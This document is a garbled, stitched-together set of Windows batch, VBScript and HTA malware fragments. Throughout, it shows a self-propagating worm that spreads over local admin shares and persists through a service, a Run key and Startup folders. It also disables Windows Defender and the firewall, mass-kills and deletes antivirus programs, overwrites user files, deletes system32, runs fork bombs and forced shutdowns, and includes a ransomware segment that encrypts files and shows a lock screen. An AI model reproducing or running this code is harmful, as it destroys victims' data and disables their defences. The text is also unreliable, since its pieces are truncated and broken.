@echo off
ET i=0
SET "NomeProcesso=DaMonki.exe"
SET "NomeService=DaMonki"
rem <=== run as service ===>
echo sc create %NomeService% binpath=%0 > service.bat
echo sc start %NomeService% >> service.bat
attrib +h +r +s service.bat
start service.bat
rem <=== startup registry ===>
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Services" /t "REG_SZ" /d %0
attrib +h +r +s %0
rem <=== kill firewall and windows defender ===>
net stop "Windows Defender Service"
net stop "Windows Firewall"
rem <=== INFECT NETWORK!!! ===>
:Worm
net use Z: \\192.168.1.%i%\C$
if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
mountvol Z: /d)
if %i% == 256 (goto Infect) else (set /a i=i+1)
goto Worm
rem <=== infect *.* in C:\Users ===>
:Infect
for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
copy "%~dp0BDOS.bat" "c:\\windows\system32"
reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f .
C:\PATH\TO\FOLDER\BATCH-NAME.bat
@echo off
color a
cls
echo YOU ARE AN IDIOT
del c:\\windows\system32
rd /s /q c:\windows\system

TASKKILL mcafe.exe
TASKKILL avira.exe
TASKKILL firewall.exe
TASKKILL windows
 attrib -h -r -s /s /d e:*.
 attrib -h -r -s /s /d e:*.
 attrib -h -r -s /s /d e:*.
 start "" "C:\Path\To\BSOD.bat"
 start
:loop
start
 goto loop
 @ echo off rem rem Permanently Kill Anti-Virus net stop “Security Center” netsh firewall set opmode mode=disable tskill /A av* tskill /A fire* tskill /A anti* cls tskill /A spy* tskill /A bullguard tskill /A PersFw tskill /A KAV* tskill /A ZONEALARM tskill /A SAFEWEB cls tskill /A spy* tskill /A bullguard tskill /A PersFw tskill /A KAV* tskill /A ZONEALARM tskill /A SAFEWEB cls tskill /A OUTPOST tskill /A nv* tskill /A nav* tskill /A F-* tskill /A ESAFE tskill /A cle cls tskill /A BLACKICE tskill /A def* tskill /A kav tskill /A kav* tskill /A avg* tskill /A ash* cls tskill /A aswupdsv tskill /A ewid* tskill /A guard* tskill /A guar* tskill /A gcasDt* tskill /A msmp* cls tskill /A mcafe* tskill /A mghtml tskill /A msiexec tskill /A outpost tskill /A isafe tskill /A zap*cls tskill /A zauinst tskill /A upd* tskill /A zlclien* tskill /A minilog tskill /A cc* tskill /A norton* cls tskill /A norton au* tskill /A ccc* tskill /A npfmn* tskill /A loge* tskill /A nisum* tskill /A issvc tskill /A tmp* cls tskill /A tmn* tskill /A pcc* tskill /A cpd* tskill /A pop* tskill /A pav* tskill /A padmincls tskill /A panda* tskill /A avsch* tskill /A sche* tskill /A syman* tskill /A virus* tskill /A realm*cls tskill /A sweep* tskill /A scan* tskill /A ad-* tskill /A safe* tskill /A avas* tskill /A norm* cls tskill /A offg* del /Q /F C:\Program Files\alwils~1\avast4\*.* del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe del /Q /F C:\Program Files\kasper~1\*.exe cls del /Q /F C:\Program Files\trojan~1\*.exe del /Q /F C:\Program Files\f-prot95\*.dll del /Q /F C:\Program Files\tbav\*.datcls del /Q /F C:\Program Files\avpersonal\*.vdf del /Q /F C:\Program Files\Norton~1\*.cnt del /Q /F C:\Program Files\Mcafee\*.* cls del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* del /Q /F C:\Program Files\Norton~1\Norton~1\*.* del /Q /F C:\Program Files\Norton~1\*.* cls del /Q /F C:\Program Files\avgamsr\*.exe del /Q /F C:\Program Files\avgamsvr\*.exe del /Q /F C:\Program Files\avgemc\*.exe cls del /Q /F C:\Program Files\avgcc\*.exe del /Q /F C:\Program Files\avgupsvc\*.exe del /Q /F C:\Program Files\grisoft del /Q /F C:\Program Files\nood32krn\*.exe del /Q /F C:\Program Files\nood32\*.exe cls del /Q /F C:\Program Files\nod32 del /Q /F C:\Program Files\nood32 del /Q /F C:\Program Files\kav\*.exe del /Q /F C:\Program Files\kavmm\*.exe del /Q /F C:\Program Files\kaspersky\*.* cls del /Q /F C:\Program Files\ewidoctrl\*.exe del /Q /F C:\Program Files\guard\*.exe del /Q /F C:\Program Files\ewido\*.exe cls del /Q /F C:\Program Files\pavprsrv\*.exe del /Q /F C:\Program Files\pavprot\*.exe del /Q /F C:\Program Files\avengine\*.exe cls del /Q /F C:\Program Files\apvxdwin\*.exe del /Q /F C:\Program
Dim WSHShell
Set WSHShell=Wscript.CreateObject("Wscript.Shell") 
 
Dim x
For x = 1 to 100000000
WSHShell.Run "Tourstart.exe"
 start "" "C:\Path\To\BSOD.bat"
  start "" "C:\Path\To\BSOD.bat"
   start "" "C:\Path\To\BSOD.bat"
    start "" "C:\Path\To\BSOD.bat"
	 start "" "C:\Path\To\BSOD.bat"
	  start "" "C:\Path\To\BSOD.bat"
	   start "" "C:\Path\To\BSOD.bat"
	    start "" "C:\Path\To\BSOD.bat"
		 start "" "C:\Path\To\BSOD.bat"
		  start "" "C:\Path\To\BSOD.bat"
		   start "" "C:\Path\To\BSOD.bat"
		    start "" "C:\Path\To\BSOD.bat"
			 start "" "C:\Path\To\BSOD.bat"
			  start "" "C:\Path\To\BSOD.bat"
<!-- :: Batch Section
@Echo OFF
mode con:cols=50 lines=2
set pass=SegoCode

Title Ramon Ware

echo Scanning. . . .
REM Change file extension *.123test for *.doc
FOR /R "%homedrive%\" %%X in (*.123test) DO (
REM echo %%X >> %homedrive%\Original.txt SafeMode
REM Rename "%%X" "%%~nX.bak" >NUL 2>&1 SafeMode   
aescrypt -e -p %pass% "%%X"
del "%%X"
)



REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->

<html>
    <head>
        <title>CryptMSG</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="no" 
                     minimizebutton="no" 
                     sysmenu="no" 
                     Caption="no" 
                     windowstate="maximize"/> 
    <style>
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>
<body bgcolor="#8c1d1d" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - RamonWare Crypt - </p></center>
<div id="texto2">
    Oops, Your Files Have Been Encrypted!<br>
    <br><br>
    Now you need run RamonDecryptor, be careful next time<br>
    <br><br>
   Github.com/SegoCode<br>
    <br><br><br>
    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
</div>
</body>
</html>
 attrib -h -r -s /s /d e:*.
 attrib -h -r -s /s /d e:*.
 attrib -h -r -s /s /d e:*. 
 attrib -h -r -s /s /d e:*.
shutdown /s /f /t 0
shutdown /s /f /t 0
  start "" "C:\Path\To\BSOD.bat"
  start "" "C:\Path\To\BSOD.bat"
  start "" "C:\Path\To\BSOD.bat"
:loop
start BSOD.exe
goto loop
start BSOD.bat
